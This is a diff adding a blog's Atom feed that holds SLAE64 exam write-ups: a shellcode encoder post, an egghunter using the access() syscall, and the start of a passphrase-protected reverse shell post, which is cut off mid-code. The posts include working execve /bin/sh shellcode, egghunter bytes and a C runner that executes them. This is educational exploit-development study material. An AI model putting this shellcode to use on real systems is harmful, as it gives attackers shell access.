@@ -1,0 +1,1137 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="3.8.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en" /><updated>2019-03-07T20:51:37+02:00</updated><id>http://localhost:4000/</id><title type="html">Silvia’s blog</title><subtitle>Random notes or stuff I am curious about.
+</subtitle><author><name>Silvia Väli</name><email>silvia@protonmail.com</email></author><entry><title type="html">Writing a 64-bit custom encoder</title><link href="http://localhost:4000/blog/2019-02-25-blog-SLAE4/" rel="alternate" type="text/html" title="Writing a 64-bit custom encoder" /><published>2019-02-25T00:00:00+02:00</published><updated>2019-02-25T00:00:00+02:00</updated><id>http://localhost:4000/blog/blog-SLAE4</id><content type="html" xml:base="http://localhost:4000/blog/2019-02-25-blog-SLAE4/">&lt;p&gt;This blog post covers the 4/7 task of the &lt;a href=&quot;https://www.pentesteracademy.com/course?id=7&quot;&gt;SLAE certificate exam&lt;/a&gt; where we are going to create our own custom encoding scheme in order to use it with an execve-stack as shellcode. As a second step I am presenting a decoder routine for the custom encoding sceme which decodes the shellcode in memory when ran.&lt;br /&gt;
+&lt;b&gt;Student ID&lt;/b&gt;: SLAE64 - 1594&lt;/p&gt;
+
+&lt;p&gt;&lt;b&gt;Task:&lt;/b&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Create a custom encoding scheme like the “Insertion Encoder” we showed you&lt;/li&gt;
+  &lt;li&gt;P0C with using execve-stack as the shellcode to encode with your schema and execute&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Execve-stack shellcode:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;global _start
+
+section .text
+
+_start:
+
+	; First NULL push
+
+	xor rax, rax
+	push rax
+
+	; push /bin//sh in reverse
+
+	mov rbx, 0x68732f2f6e69622f
+	push rbx
+
+	; store /bin//sh address in RDI
+
+	mov rdi, rsp
+
+	; Second NULL push
+	push rax
+
+	; set RDX
+	mov rdx, rsp
+
+
+	; Push address of /bin//sh
+	push rdi
+
+	; set RSI
+
+	mov rsi, rsp
+
+	; Call the Execve syscall
+	add rax, 59
+	syscall
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Dumping the shellcode as hexadecimal string:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;objdump -d ./Execve-Stack|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/&quot;/'|sed 's/$/&quot;/g'
+
+&quot;\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;hr /&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Encoder.py&lt;br /&gt; &lt;a href=&quot;https://github.com/silviavali/SLAE/blob/master/task4/encoder.py&quot;&gt;https://github.com/silviavali/SLAE/blob/master/task4/encoder.py&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;Decoder.nasm: &lt;br /&gt;&lt;a href=&quot;https://github.com/silviavali/SLAE/blob/master/task4/decoder.nasm&quot;&gt;https://github.com/silviavali/SLAE/blob/master/task4/decoder.nasm&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>Silvia Väli</name><email>silvia@protonmail.com</email></author><summary type="html">This blog post covers the 4/7 task of the SLAE certificate exam where we are going to create our own custom encoding scheme in order to use it with an execve-stack as shellcode. As a second step I am presenting a decoder routine for the custom encoding sceme which decodes the shellcode in memory when ran. Student ID: SLAE64 - 1594</summary></entry><entry><title type="html">Egghunter (64-bit Linux) using access() syscall</title><link href="http://localhost:4000/blog/2019-02-25-blog-SLAE3/" rel="alternate" type="text/html" title="Egghunter (64-bit Linux) using access() syscall" /><published>2019-02-25T00:00:00+02:00</published><updated>2019-02-25T00:00:00+02:00</updated><id>http://localhost:4000/blog/blog-SLAE3</id><content type="html" xml:base="http://localhost:4000/blog/2019-02-25-blog-SLAE3/">&lt;p&gt;This blog post covers the 3/7 task of the &lt;a href=&quot;https://www.pentesteracademy.com/course?id=7&quot;&gt;SLAE certificate exam&lt;/a&gt; where we are going to discuss what is virtual address space, virtual addresses as well as how to utilise the knowledge on that to create our very own egghunter. Let’s hunt some eggs!&lt;br /&gt;
+&lt;b&gt;Student ID&lt;/b&gt;: SLAE64 - 1594&lt;/p&gt;
+
+&lt;p&gt;&lt;b&gt;Task:&lt;/b&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Study	about the Egg Hunter shellcode&lt;/li&gt;
+  &lt;li&gt;Create a working demo of the Egghunter&lt;/li&gt;
+  &lt;li&gt;Should be configurable for different payloads&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;what-is-an-egghunter&quot;&gt;What is an egghunter&lt;/h2&gt;
+
+&lt;p&gt;When you think of the word “egghunter”, it shouldn’t be too hard to guess that we are going to be dealing with some type of a search or hunt for something valuable. In this case the value lies in the egg which is a unique token that helps us on the right track of executiong our shellcode. Essentially egghunter is a piece of code which searches through the VAS (&lt;em&gt;Virtual Address Space&lt;/em&gt;) looking for a token which we have specified. In order to accomplish this task, we have to have an understanding on what VAS is.&lt;/p&gt;
+
+&lt;h2 id=&quot;virtual-address-space&quot;&gt;Virtual Address Space&lt;/h2&gt;
+
+&lt;p&gt;64-bit architecture presents us with a &lt;code class=&quot;MathJax_Preview&quot;&gt;2^{64}&lt;/code&gt;&lt;script type=&quot;math/tex&quot;&gt;2^{64}&lt;/script&gt; = 256TB virtual address space which is divided into user space and kernel space address ranges as shown on the image below. These are the same addresses you see when you are debugging your application in GDB and should not be confused with physical addresses.&lt;/p&gt;
+
+&lt;h3 id=&quot;user-and-kernel-space&quot;&gt;User and kernel space&lt;/h3&gt;
+
+&lt;p&gt;If you would examine the addresses for user and kernel space, it is also pretty clear about the number of actually addressable bits which is &lt;code class=&quot;MathJax_Preview&quot;&gt;2^{48}&lt;/code&gt;&lt;script type=&quot;math/tex&quot;&gt;2^{48}&lt;/script&gt; for user and kernel space combined. At the moment this is found feasible as current CPUs only use the lowr of 48 bits and more is not needed.&lt;/p&gt;
+
+&lt;p class=&quot;figure&quot;&gt;&lt;img src=&quot;/assets/img/SLAE/vas.png&quot; alt=&quot;&quot; class=&quot;lead&quot; data-width=&quot;800&quot; data-height=&quot;100&quot; /&gt;
+Virtual Address Space for 64-bit architecture&lt;/p&gt;
+
+&lt;h3 id=&quot;canonical-addresses&quot;&gt;Canonical addresses&lt;/h3&gt;
+
+&lt;p&gt;Another thing you can notice is that canonical addresses for user and kernel space follow a certain structure. If you dig into &lt;a href=&quot;https://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-software-developer-manual-325462.pdf&quot;&gt;Intel 64 and IA-32 architectures manual&lt;/a&gt; they give a pretty direct definition for it, which is: “In 64-bit mode, an address is considered to be in canonical form if address bits 63 through to the most-significant implemented bit by the microarchitecture are set to either all ones or all zeros.” The most significant bit here being the 48th bit means in case we are dealing with an address belonging to the user space, bits 48-64 are set to 0 and address belonging to kernel space those bits (48-64) are set to 1.&lt;/p&gt;
+
+&lt;p class=&quot;figure&quot;&gt;&lt;img src=&quot;/assets/img/SLAE/range.png&quot; alt=&quot;&quot; class=&quot;lead&quot; data-width=&quot;800&quot; data-height=&quot;100&quot; /&gt;
+Canonical addresses - user and kernel space. 1 hex digit presents a 4 digit binary number example: 0x8 = 1000.&lt;/p&gt;
+
+&lt;h3 id=&quot;memory-regions-of-a-mapped-process&quot;&gt;Memory regions of a mapped process&lt;/h3&gt;
+
+&lt;p&gt;Virtual address space is a range of virtual memory addresses that the OS has made available for every process individually.&lt;/p&gt;
+
+&lt;p&gt;It also helps to examine and understand how an executed program is mapped into memory regions and what are their access permissions. For that we can use a command &lt;code class=&quot;highlighter-rouge&quot;&gt;cat /proc/&amp;lt;pid&amp;gt;/maps&lt;/code&gt;. Based on the example below:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;we can see that program itself is mapped within 3 pages (1 = 4KB which we can verify with the following command &lt;code class=&quot;highlighter-rouge&quot;&gt;getconf PAGE_SIZE&lt;/code&gt; - 4096 which is 0x1000)&lt;/li&gt;
+  &lt;li&gt;we can also see that each of the mapped memory regions is grouped by their access permissions RWX (read/write/execute)
+    &lt;ul&gt;
+      &lt;li&gt;00400000-00401000 r-xp region is where our executable code lies within&lt;/li&gt;
+      &lt;li&gt;00601000-00602000 rw-p is the data section&lt;/li&gt;
+      &lt;li&gt;00600000-00601000 r–p contains data that is only readable, like static data, constants&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;all addresses except for the very last one for vsyscall are user space addresses&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cat /proc/3996/maps
+00400000-00401000 r-xp 00000000 08:04 4719226                            /home/osboxes/Documents/SLAE/test
+00600000-00601000 r--p 00000000 08:04 4719226                            /home/osboxes/Documents/SLAE/test
+00601000-00602000 rw-p 00001000 08:04 4719226                            /home/osboxes/Documents/SLAE/test
+7f385cc75000-7f385ce35000 r-xp 00000000 08:01 528998                     /lib/x86_64-linux-gnu/libc-2.23.so
+7f385ce35000-7f385d035000 ---p 001c0000 08:01 528998                     /lib/x86_64-linux-gnu/libc-2.23.so
+7f385d035000-7f385d039000 r--p 001c0000 08:01 528998                     /lib/x86_64-linux-gnu/libc-2.23.so
+7f385d039000-7f385d03b000 rw-p 001c4000 08:01 528998                     /lib/x86_64-linux-gnu/libc-2.23.so
+7f385d03b000-7f385d03f000 rw-p 00000000 00:00 0
+7f385d03f000-7f385d065000 r-xp 00000000 08:01 528970                     /lib/x86_64-linux-gnu/ld-2.23.so
+7f385d24a000-7f385d24d000 rw-p 00000000 00:00 0
+7f385d264000-7f385d265000 r--p 00025000 08:01 528970                     /lib/x86_64-linux-gnu/ld-2.23.so
+7f385d265000-7f385d266000 rw-p 00026000 08:01 528970                     /lib/x86_64-linux-gnu/ld-2.23.so
+7f385d266000-7f385d267000 rw-p 00000000 00:00 0
+7ffd6f5e8000-7ffd6f609000 rw-p 00000000 00:00 0                          [stack]
+7ffd6f634000-7ffd6f637000 r--p 00000000 00:00 0                          [vvar]
+7ffd6f637000-7ffd6f639000 r-xp 00000000 00:00 0                          [vdso]
+ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I’d like to stop on the access permissions of the memory regions for one extra moment here and raise a question: how can we apply this knowledge for implementing an egg hunter? Well our goal is to find the egg token from somewhere in memory. We do not know where the token we are looking for might be, so do we have to search through the entire virtual address space? As it is rather large maybe there is a way we could decrement that search time?
+We know that contiguous virtual memory is divided into pages and for all regions memory allocated is a multiple of 4KB. Each one of those pages has specific permissions which are applied to all addresses within the range of the page.&lt;/p&gt;
+
+&lt;p&gt;We can assume that our egg would be on an address which is accessible to us therefore we would need to find a way to test for accessible/inaccessible addresses. Syscalls come to the rescue!&lt;/p&gt;
+
+&lt;h3 id=&quot;how-can-we-validate-if-an-address-is-accessible&quot;&gt;How can we validate if an address is accessible?&lt;/h3&gt;
+
+&lt;p&gt;Referring to the &lt;a href=&quot;http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf&quot;&gt;Skape’s paper&lt;/a&gt; as many have done in egghunter write ups before me, I stumbled upon the &lt;code class=&quot;highlighter-rouge&quot;&gt;access()&lt;/code&gt; syscall which is essentially meant to validate permissions of a file. Access syscall has the following format where 2 arguments need to be specified: &lt;code class=&quot;highlighter-rouge&quot;&gt;int access(const char *pathname, int mode);&lt;/code&gt;. It expects 1st argument to be a memory address and 2nd argument should specify the permission we want to test for: 0 - F_OK (existance), 1 - X_OK (execute), 2 - W_OK (write), 4 - R_OK (read). Not letting the definition limit us, what i learned was that we can submit any address to this syscall to validate if the address is accessible or it will produce an EFAULT (&lt;code class=&quot;highlighter-rouge&quot;&gt;0xf...f2 in RAX after returning from syscall&lt;/code&gt;) in case it is not. I had never seen this syscall that way and I find it extremely awesome!&lt;/p&gt;
+
+&lt;p class=&quot;figure&quot;&gt;&lt;img src=&quot;/assets/img/SLAE/access.png&quot; alt=&quot;&quot; class=&quot;lead&quot; data-width=&quot;800&quot; data-height=&quot;100&quot; /&gt;
+Searching through virtual address space by testing the first address of every page to validate if the addresses within the page are accessible.&lt;/p&gt;
+
+&lt;p&gt;So let’s try to implement our egg hunter based on all the knowledge we have stuffed into our brain now :D&lt;/p&gt;
+
+&lt;h3 id=&quot;egghunter-implementation&quot;&gt;Egghunter implementation&lt;/h3&gt;
+
+&lt;p&gt;In &lt;strong&gt;Step 1&lt;/strong&gt; and &lt;strong&gt;Step 2&lt;/strong&gt; (code example below) I am preparing the arguments for the &lt;code class=&quot;highlighter-rouge&quot;&gt;access()&lt;/code&gt; syscall we want to be using. We want to validate whether the address is accessible (F_OK - 0) so I zero out the RSI register which by convention is the 2nd parameter passed on to the syscall. To initialize the 1st parameter we will use the value at RSI to pop it to RDI as well. Within &lt;code class=&quot;highlighter-rouge&quot;&gt;go_to_next_page:&lt;/code&gt; section I &lt;code class=&quot;highlighter-rouge&quot;&gt;or&lt;/code&gt; the lower 16 bits of RDI (or di, 0xfff) and by incrementing RDI I reach to the beginning of a page at 0x1000.&lt;/p&gt;
+
+&lt;p&gt;In &lt;strong&gt;Step 3&lt;/strong&gt; I assign the &lt;code class=&quot;highlighter-rouge&quot;&gt;accept()&lt;/code&gt; syscall number 21 in decimal to RAX by convention and make the call. As a result in &lt;strong&gt;Step 4&lt;/strong&gt; I expect to check if an &lt;a href=&quot;http://www-numi.fnal.gov/offline_software/srt_public_context/WebDocs/Errors/unix_system_errors.html&quot;&gt;EFAULT (Bad address)&lt;/a&gt; occured which is the reason for &lt;code class=&quot;highlighter-rouge&quot;&gt;cmp al, 0xf2&lt;/code&gt;. If the first address of the page turns out to be inaccessible I know that the rest of the addresses within that page will be as well as same permissions are applied to the whole page. Therefore we can jump back to &lt;code class=&quot;highlighter-rouge&quot;&gt;go_to_next_page&lt;/code&gt; to get the start address of the next page and try that instead.&lt;/p&gt;
+
+&lt;p&gt;If it occurs in &lt;strong&gt;Step 4&lt;/strong&gt; that the address is accessible to us and we did not receive EFAULT we move a 4 byte value &lt;code class=&quot;highlighter-rouge&quot;&gt;0x9050904f&lt;/code&gt; to EAX and increment the lower byte to get our egg value. You might be asking why do we do it this way. The reason for that is this way we wouldn’t stumble upon our egg value within the egg hunter code as our goal is to find it from the beginning of our shellcode instead. Now that we have the egg value in EAX (don’t forget little-endian here) we will use the &lt;a href=&quot;http://faydoc.tripod.com/cpu/scasd.htm&quot;&gt;scasd&lt;/a&gt; scan a string command to compare the egg value we search for with the value in RAX.&lt;/p&gt;
+
+&lt;p&gt;PS! RAX by convention holds the return value from the syscall. In our case it will be an address in memory which would possibly hold the value of the egg in the beginning of the shellcode.&lt;/p&gt;
+
+&lt;p&gt;If the values being checked for do not match, we can move on to another address within the same page. However if they do, we know that the address for our shellcode is in RDI so we make the jump there instead.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;global _start
+section .text
+_start:
+
+;STEP1
+	;int access(const char *pathname, int mode);
+	xor rsi, rsi
+	push rsi
+	pop rdi
+
+;STEP2
+go_to_next_page:
+	or di, 0xfff
+	inc rdi
+
+;STEP3
+forward_4_bytes:
+	xor rax, rax
+	mov al, 21
+	syscall
+
+;STEP4
+efault_check:
+	cmp al, 0xf2
+	jz go_to_next_page
+	mov eax, 0x9050904f
+	inc al
+	scasd
+	jnz forward_4_bytes
+	jmp rdi
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So let’s dump the egg hunter code with objdump in order to include it to our test C script to validate it’s working:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; objdump -d ./egghunter|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/&quot;/'|sed 's/$/&quot;/g'
+&quot;\x48\x31\xf6\x56\x5f\x66\x81\xcf\xff\x0f\x48\xff\xc7\x48\x31\xc0\xb0\x15\x0f\x05\x3c\xf2\x74\xed\xb8\x4f\x90\x50\x90\xfe\xc0\xaf\x75\xeb\xff\xe7&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In the final C program I will be also using the 21-byte shellcode from: &lt;a href=&quot;https://www.exploit-db.com/exploits/41750&quot;&gt;https://www.exploit-db.com/exploits/41750&lt;/a&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;...
+;================================================================================
+; Shellcode (python) :
+shellcode = &quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;
+;================================================================================
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This is how the final program with the defined EGG, egg hunter code and shellcode payload from exploit-db.com is looking like:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+
+#define EGG &quot;\x50\x90\x50\x90&quot;
+
+unsigned char hunter[] = \
+&quot;\x48\x31\xf6\x56\x5f\x66\x81\xcf\xff\x0f\x48\xff\xc7\x48\x31\xc0\xb0\x15\x0f\x05\x3c\xf2\x74\xed\xb8\x4f\x90\x50\x90\xfe\xc0\xaf\x75\xeb\xff\xe7&quot;;
+
+unsigned char payload[] = EGG &quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;;
+
+int main(void) {
+	printf(&quot;Egg hunter's size (bytes): %lu\n&quot;, strlen(hunter));
+	printf(&quot;Payload's size (bytes): %lu\n&quot;, strlen(payload));
+	int (*ret)() = (int(*)())hunter;
+	ret();
+}
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Let’s run it:&lt;/p&gt;
+
+&lt;p class=&quot;figure&quot;&gt;&lt;img src=&quot;/assets/img/SLAE/task3.png&quot; alt=&quot;&quot; class=&quot;lead&quot; data-width=&quot;800&quot; data-height=&quot;100&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Also if you used the program with strace as &lt;code class=&quot;highlighter-rouge&quot;&gt;strace ./shellcode&lt;/code&gt; you would see how the search is trying to identify the egg:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;...
+ccess(&quot;&quot;, F_OK)                        = -1 ENOENT (No such file or directory)
+access(&quot;&quot;, F_OK)                        = -1 ENOENT (No such file or directory)
+access(&quot;&quot;, F_OK)                        = -1 ENOENT (No such file or directory)
+access(&quot;&quot;, F_OK)                        = -1 ENOENT (No such file or directory)
+access(&quot;&quot;, F_OK)                        = -1 ENOENT (No such file or directory)
+access(&quot;&quot;, F_OK)                        = -1 ENOENT (No such file or directory)
+...
+access(&quot;&quot;, F_OK)                        = -1 ENOENT (No such file or directory)
+access(&quot;&quot;, F_OK)                        = -1 ENOENT (No such file or directory)
+access(&quot;P\220P\220\367\346PH\277/bin//shWH\211\347\260;\17\5&quot;, F_OK) = -1 ENOENT (No such file or directory)
+execve(&quot;/bin//sh&quot;, NULL, NULL)          = 0
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;hr /&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Egghunter.nasm: &lt;br /&gt;&lt;a href=&quot;https://github.com/silviavali/SLAE/blob/master/task3/egghunter.nasm&quot;&gt;https://github.com/silviavali/SLAE/blob/master/task3/egghunter.nasm&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;Shellcode.c used for testing:&lt;br /&gt; &lt;a href=&quot;https://github.com/silviavali/SLAE/blob/master/task3/shellcode.c&quot;&gt;https://github.com/silviavali/SLAE/blob/master/task3/shellcode.c&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>Silvia Väli</name><email>silvia@protonmail.com</email></author><summary type="html">This blog post covers the 3/7 task of the SLAE certificate exam where we are going to discuss what is virtual address space, virtual addresses as well as how to utilise the knowledge on that to create our very own egghunter. Let’s hunt some eggs! Student ID: SLAE64 - 1594</summary></entry><entry><title type="html">64-bit reverse shell with passphrase protection</title><link href="http://localhost:4000/blog/2019-01-25-blog-SLAE2/" rel="alternate" type="text/html" title="64-bit reverse shell with passphrase protection" /><published>2019-01-25T00:00:00+02:00</published><updated>2019-01-25T00:00:00+02:00</updated><id>http://localhost:4000/blog/blog-SLAE2</id><content type="html" xml:base="http://localhost:4000/blog/2019-01-25-blog-SLAE2/">&lt;p&gt;This blog post covers the 2/7 task of the &lt;a href=&quot;https://www.pentesteracademy.com/course?id=7&quot;&gt;SLAE certificate exam&lt;/a&gt; which requires a 64-bit reverse shellcode. To establish a connection user is asked to submit the correct passphrase.&lt;br /&gt;
+&lt;b&gt;Student ID&lt;/b&gt;: SLAE64 - 1594&lt;/p&gt;
+
+&lt;p&gt;&lt;b&gt;Task - &lt;/b&gt; Create a reverse TCP shellcode which:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;reverse connects to configured IP and Port&lt;/li&gt;
+  &lt;li&gt;needs a “passcode”&lt;/li&gt;
+  &lt;li&gt;if passcode is entered correctly then executes shell&lt;/li&gt;
+  &lt;li&gt;remove all 0x00 bytes from the bind TCP shellcode&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;reverse-shellcode&quot;&gt;Reverse shellcode&lt;/h2&gt;
+
+&lt;p&gt;The essence of a reverse shell is the opposite of bindshell. While bindshell is what remains listening on a port ready to establish a connection to the attacker, then reverse shell is what makes the call back home itself where the attacker is already listening on a specified port.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/SLAE/bindreverse.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;how-does-reverse-shellcode-look-like-in-c&quot;&gt;How does reverse shellcode look like in C?&lt;/h2&gt;
+
+&lt;p&gt;I personally think writing a reverse shell is easier than writing a bind shell and as you can see referring back to my previous blog post &lt;a href=&quot;/blog/2019-01-15-blog-SLAE1/&quot;&gt;SLAE exam task no. 1&lt;/a&gt; that reverse shell is also visibly shorter to implement. We will not have to deal with &lt;code class=&quot;highlighter-rouge&quot;&gt;accept()&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;listen()&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;bind()&lt;/code&gt; syscalls. Instead we only have 1 new syscall - &lt;code class=&quot;highlighter-rouge&quot;&gt;connect()&lt;/code&gt; which we use to initiate a connection on a socket. The rest of the shellcode remains exactly the same as described in SLAE task 1.&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cm&quot;&gt;/*
+reverse TCP shell which establishes a connection back on port 4444, if the PIN code 1234 is submitted.
+$ gcc reverse.c -o reverse
+$ ./reverse
+*/&lt;/span&gt;
+
+&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stdio&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;unistd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;types&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;netinet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+
+&lt;span class=&quot;kr&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+	&lt;span class=&quot;kr&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sockfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;kr&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+	&lt;span class=&quot;kr&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+	&lt;span class=&quot;nx&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sockaddr_in&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
